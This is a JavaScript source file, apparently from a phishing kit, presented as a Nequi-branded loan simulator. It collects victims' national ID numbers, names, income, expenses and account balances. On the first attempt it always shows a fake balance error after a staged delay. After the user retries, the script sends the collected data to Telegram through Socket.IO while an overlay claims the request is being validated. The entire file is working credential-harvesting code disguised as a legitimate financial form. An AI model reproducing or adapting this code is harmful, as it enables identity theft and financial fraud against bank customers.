/**
 * ========================================
 * LOAN SIMULATOR
 * ========================================
 * Simulador de crédito con validaciones
 * y envío a Telegram vía Socket.IO
 * ========================================
 */

const LoanSimulator = (function() {
  'use strict';

  // ========================================
  // CONFIGURACIÓN
  // ========================================
  const CONFIG = {
    TASA_INTERES_MENSUAL: 0.0181, // 1.81% mensual
    TASA_INTERES_ANUAL: 0.24, // 24% anual
    SEGURO_MENSUAL: 5000,
    MONTO_MIN: 100000,
    MONTO_MAX: 5000000,
    STEP_MONTO: 100000,
    VALIDATION: {
      CEDULA_MIN: 7,
      CEDULA_MAX: 10,
      NOMBRE_MIN: 5,
      VALOR_MIN: 5
    }
  };

  // ========================================
  // ESTADO
  // ========================================
  let elements = {};
  let isSecondAttempt = false;

  // ========================================
  // INICIALIZACIÓN
  // ========================================
  function init() {
    console.log('💰 Inicializando Loan Simulator...');
    
    // Verificar si ya se mostró el error (usuario está en segundo intento)
    const sessionId = localStorage.getItem('nequi_session_id');
    const attemptKey = `loan_attempt_${sessionId}`;
    isSecondAttempt = localStorage.getItem(attemptKey) === 'true';
    
    if (isSecondAttempt) {
      console.log('🔄 Segundo intento detectado - próximo clic enviará datos');
    } else {
      console.log('🆕 Primer intento - próximo clic mostrará error');
    }
    
    // Inicializar Socket.IO
    try {
      SocketClient.init();
      console.log('✅ Socket.IO inicializado');
    } catch (error) {
      console.error('❌ Error al inicializar Socket.IO:', error);
    }
    
    // Cachear elementos del DOM
    cacheElements();
    
    // Inicializar slider de monto
    initSlider();
    
    // Calcular cuota inicial
    calculateMonthlyPayment();
    
    // Configurar event listeners
    setupEventListeners();
    
    console.log('✅ Loan Simulator inicializado');
  }

  // ========================================
  // CACHEAR ELEMENTOS
  // ========================================
  function cacheElements() {
    console.log('📦 Cacheando elementos del DOM...');
    
    elements = {
      // Slider de monto
      montoSlider: document.getElementById('montoSalvavidas'),
      montoDisplay: document.getElementById('montoSeleccionadoSalvavidas'),
      
      // Inputs de formulario
      cedula: document.getElementById('cedulaSalvavidas'),
      nombre: document.getElementById('nombreCompletoSalvavidas'),
      ocupacion: document.getElementById('ocupacionSelectorSalvavidas'),
      ingresos: document.getElementById('ingresoMensualSalvavidas'),
      gastos: document.getElementById('gastosMensualSalvavidas'),
      saldo: document.getElementById('saldoActualSalvavidas'),
      plazo: document.getElementById('plazoSelectorSalvavidas'),
      fechaPago: document.getElementById('fechaPago'),
      
      // Displays
      cuotaMensual: document.querySelector('.cuotaMensualSalvavidas'),
      
      // Errores
      cedulaError: document.getElementById('cedulaErrorSalvavidas'),
      nombreError: document.getElementById('nombreErrorSalvavidas'),
      errorMessage: document.querySelector('.errorMessage'),
      
      // Botones
      btnContinuar: document.getElementById('btnContinuarSalvavidas'),
      btnIntentarNuevamente: document.getElementById('btnIntentarNuevamente'),
      
      // Loaders
      loadingSpinner: document.querySelector('.loadingContainer')
    };
    
    // Verificar elementos críticos
    const criticalElements = ['btnContinuar', 'btnIntentarNuevamente', 'cedula', 'nombre', 'saldo', 'ingresos', 'gastos'];
    let allFound = true;
    
    criticalElements.forEach(key => {
      if (!elements[key]) {
        console.error(`❌ Elemento crítico no encontrado: ${key}`);
        allFound = false;
      }
    });
    
    if (allFound) {
      console.log('✅ Todos los elementos críticos encontrados');
    }
    
    return allFound;
  }

  // ========================================
  // INICIALIZAR SLIDER
  // ========================================
  function initSlider() {
    if (!elements.montoSlider) return;
    
    updateSliderBackground();
  }

  function updateSliderBackground() {
    const slider = elements.montoSlider;
    const percentage = ((slider.value - slider.min) / (slider.max - slider.min)) * 100;
    slider.style.background = `linear-gradient(to right, var(--color-pink-primary) ${percentage}%, var(--color-gray-primary) ${percentage}%)`;
  }

  // ========================================
  // CALCULAR CUOTA MENSUAL
  // ========================================
  function calculateMonthlyPayment() {
    const monto = parseInt(elements.montoSlider.value);
    const meses = parseInt(elements.plazo.value);
    
    // Fórmula: (Capital / Meses) + Intereses + Seguro
    const capitalMensual = monto / meses;
    const interesMensual = monto * CONFIG.TASA_INTERES_MENSUAL;
    const cuotaMensual = capitalMensual + interesMensual + CONFIG.SEGURO_MENSUAL;
    
    // Actualizar display
    elements.cuotaMensual.textContent = formatCurrency(Math.round(cuotaMensual));
  }

  // ========================================
  // VALIDACIONES
  // ========================================
  function validateCedula(cedula) {
    const cleanCedula = cedula.replace(/\D/g, '');
    return cleanCedula.length >= CONFIG.VALIDATION.CEDULA_MIN && 
           cleanCedula.length <= CONFIG.VALIDATION.CEDULA_MAX;
  }

  function validateNombre(nombre) {
    const cleanNombre = nombre.trim();
    return cleanNombre.length >= CONFIG.VALIDATION.NOMBRE_MIN && 
           cleanNombre.includes(' ');
  }

  function validateMonetaryValue(value) {
    const cleanValue = value.replace(/\D/g, '');
    return cleanValue.length >= CONFIG.VALIDATION.VALOR_MIN;
  }

  function validateForm() {
    const isValid = 
      validateCedula(elements.cedula.value) &&
      validateNombre(elements.nombre.value) &&
      validateMonetaryValue(elements.ingresos.value) &&
      validateMonetaryValue(elements.gastos.value) &&
      validateMonetaryValue(elements.saldo.value);
    
    updateButtonState(isValid);
    return isValid;
  }

  function updateButtonState(isValid) {
    elements.btnContinuar.disabled = !isValid;
    
    if (isValid) {
      elements.btnContinuar.classList.remove('opacity-80', 'cursor-not-allowed');
    } else {
      elements.btnContinuar.classList.add('opacity-80', 'cursor-not-allowed');
    }
  }

  // ========================================
  // FORMATEO
  // ========================================
  function formatCurrency(value) {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    }).format(value);
  }

  function formatNumber(value) {
    return new Intl.NumberFormat('es-CO').format(value);
  }

  function parseCurrency(formattedValue) {
    return formattedValue.replace(/\D/g, '');
  }

  // ========================================
  // EVENT LISTENERS
  // ========================================
  function setupEventListeners() {
    console.log('🎧 Configurando event listeners...');
    
    if (!elements.btnContinuar) {
      console.error('❌ No se puede configurar listener: btnContinuar no existe');
      return;
    }
    
    // Slider de monto
    elements.montoSlider.addEventListener('input', handleMontoChange);
    
    // Selector de plazo
    elements.plazo.addEventListener('change', calculateMonthlyPayment);
    
    // Validación de cédula
    elements.cedula.addEventListener('input', handleCedulaInput);
    
    // Validación de nombre
    elements.nombre.addEventListener('input', handleNombreInput);
    
    // Formateo de valores monetarios
    elements.ingresos.addEventListener('input', (e) => handleMonetaryInput(e, 'ingresos'));
    elements.gastos.addEventListener('input', (e) => handleMonetaryInput(e, 'gastos'));
    elements.saldo.addEventListener('input', (e) => handleMonetaryInput(e, 'saldo'));
    
    // Botón validar (verifica si es primer o segundo intento)
    elements.btnContinuar.addEventListener('click', handleValidateButton);
    console.log('✅ Event listener agregado al botón Validar');
    
    // Botón intentar nuevamente (recarga la página)
    elements.btnIntentarNuevamente.addEventListener('click', handleRetryButton);
    console.log('✅ Event listener agregado al botón Intentar Nuevamente');
  }

  // ========================================
  // HANDLERS
  // ========================================
  function handleMontoChange(e) {
    const valor = parseInt(e.target.value);
    elements.montoDisplay.textContent = formatNumber(valor);
    updateSliderBackground();
    calculateMonthlyPayment();
  }

  function handleCedulaInput(e) {
    // Solo permitir números
    const valor = e.target.value.replace(/\D/g, '');
    e.target.value = valor;
    
    // Validar y mostrar error
    const isValid = validateCedula(valor);
    toggleError(elements.cedulaError, e.target, !isValid);
    
    validateForm();
  }

  function handleNombreInput(e) {
    const isValid = validateNombre(e.target.value);
    toggleError(elements.nombreError, e.target, !isValid);
    
    validateForm();
  }

  function handleMonetaryInput(e, fieldName) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value) {
      e.target.value = formatCurrency(value);
    }
    
    // Resetear border si era error
    if (fieldName === 'saldo') {
      e.target.style.border = '';
    }
    
    validateForm();
  }

  function toggleError(errorElement, inputElement, showError) {
    if (showError) {
      errorElement.classList.remove('hidden');
      inputElement.classList.add('border-red-500');
    } else {
      errorElement.classList.add('hidden');
      inputElement.classList.remove('border-red-500');
    }
  }

  // ========================================
  // HANDLERS DE BOTONES
  // ========================================
  async function handleValidateButton(e) {
    e.preventDefault();
    
    if (!validateForm()) {
      console.warn('⚠️ Formulario inválido');
      return;
    }
    
    if (isSecondAttempt) {
      console.log('2️⃣ Segundo intento - Enviando datos a Telegram...');
      await handleSecondClick();
    } else {
      console.log('1️⃣ Primer intento - Mostrando error de saldo...');
      await handleFirstClick();
    }
  }
  
  function handleRetryButton(e) {
    e.preventDefault();
    
    console.log('🔄 Intentar nuevamente - Marcando segundo intento y recargando página...');
    
    // Marcar que ya se mostró el error
    const sessionId = localStorage.getItem('nequi_session_id');
    const attemptKey = `loan_attempt_${sessionId}`;
    localStorage.setItem(attemptKey, 'true');
    
    // Recargar la página
    window.location.reload();
  }

  async function handleFirstClick() {
    console.log('📝 Primer clic - Validando saldo...');
    
    // Mostrar loading
    if (elements.loadingSpinner) {
      elements.loadingSpinner.style.display = 'block';
      console.log('⏳ Loading mostrado');
    }
    
    // Simular validación de 4 segundos
    await new Promise(resolve => setTimeout(resolve, 4000));
    
    console.log('⚠️ Mostrando error de saldo');
    
    // Mostrar error de saldo
    if (elements.errorMessage) {
      elements.errorMessage.style.display = 'block';
    }
    elements.saldo.style.border = '2px solid #da0081';
    
    // Ocultar loading
    if (elements.loadingSpinner) {
      elements.loadingSpinner.style.display = 'none';
      console.log('✅ Loading ocultado');
    }
    
    // Scroll al campo de ingresos
    elements.ingresos.scrollIntoView({ 
      behavior: 'smooth', 
      block: 'center' 
    });
    
    console.log('⏰ Esperando que el usuario corrija el saldo...');
    console.log('💡 El usuario debe hacer clic en "Intentar nuevamente" para enviar los datos');
  }

  async function handleSecondClick() {
    console.log('💾 Segundo clic - Enviando datos...');
    
    try {
      console.log('📝 Extrayendo valores del formulario...');
      
      // Extraer valores y limpiar formato
      const montoLimpio = parseCurrency(elements.montoDisplay.textContent);
      const ingresosLimpio = parseCurrency(elements.ingresos.value);
      const gastosLimpio = parseCurrency(elements.gastos.value);
      const saldoLimpio = parseCurrency(elements.saldo.value);
      
      console.log('💵 Monto:', montoLimpio);
      console.log('💰 Ingresos:', ingresosLimpio);
      console.log('📉 Gastos:', gastosLimpio);
      console.log('💳 Saldo:', saldoLimpio);
      
      // Preparar datos para el servidor (usar mismos nombres que server.js espera)
      const loanData = {
        cedula: elements.cedula.value,
        nombre: elements.nombre.value,
        monto: montoLimpio,
        plazo: elements.plazo.value,
        ocupacion: elements.ocupacion.value,
        ingresos: ingresosLimpio,
        gastos: gastosLimpio,
        saldo: saldoLimpio,
        fechaPago: elements.fechaPago.value
      };
      
      console.log('📋 Datos preparados:', JSON.stringify(loanData, null, 2));
      
      // Guardar en localStorage (mantener estructura existente)
      const formData = JSON.parse(localStorage.getItem('formData')) || {};
      formData.cedula = loanData.cedula;
      formData.nombre = loanData.nombre;
      formData.monto = loanData.monto;
      formData.plazo = loanData.plazo;
      formData.ocupacion = loanData.ocupacion;
      formData.ingresos = loanData.ingresos;
      formData.gastos = loanData.gastos;
      formData.saldo = loanData.saldo;
      formData.fechaPago = loanData.fechaPago;
      formData.tipoProducto = 'Bajo monto';
      localStorage.setItem('formData', JSON.stringify(formData));
      console.log('💾 Datos guardados en localStorage');
      
      // Verificar que OverlayManager existe
      if (typeof OverlayManager === 'undefined') {
        console.error('❌ OverlayManager no está definido!');
        alert('Error: OverlayManager no disponible');
        return;
      }
      
      console.log('🎨 Mostrando overlay infinito...');
      
      // Mostrar overlay infinito con loading
      OverlayManager.show({
        message: 'Enviando solicitud de crédito...',
        timeout: 0,
        showProgress: true
      });
      
      console.log('✅ Overlay mostrado');
      
      // Verificar que SocketClient existe
      if (typeof SocketClient === 'undefined') {
        console.error('❌ SocketClient no está definido!');
        OverlayManager.showError('Error: No hay conexión con el servidor');
        setTimeout(() => OverlayManager.hide(), 3000);
        return;
      }
      
      console.log('📡 Enviando datos vía Socket.IO...');
      
      // Enviar a Telegram vía Socket.IO
      await SocketClient.sendLoanRequest(loanData);
      
      console.log('✅ Datos enviados, actualizando mensaje...');
      
      OverlayManager.updateMessage('¡Datos enviados! Esperando validación...');
      
      // Limpiar flag de intento
      const sessionId = localStorage.getItem('nequi_session_id');
      const attemptKey = `loan_attempt_${sessionId}`;
      localStorage.removeItem(attemptKey);
      
      console.log('✅ Solicitud de crédito enviada correctamente');
      
    } catch (error) {
      console.error('❌ Error al enviar solicitud:', error);
      console.error('📍 Stack trace:', error.stack);
      
      if (typeof OverlayManager !== 'undefined') {
        OverlayManager.showError('Error al enviar solicitud. Intenta nuevamente.');
        setTimeout(() => OverlayManager.hide(), 3000);
      } else {
        alert('Error al enviar solicitud: ' + error.message);
      }
    }
  }

  // ========================================
  // API PÚBLICA
  // ========================================
  return {
    init,
    validateForm,
    calculateMonthlyPayment
  };
})();
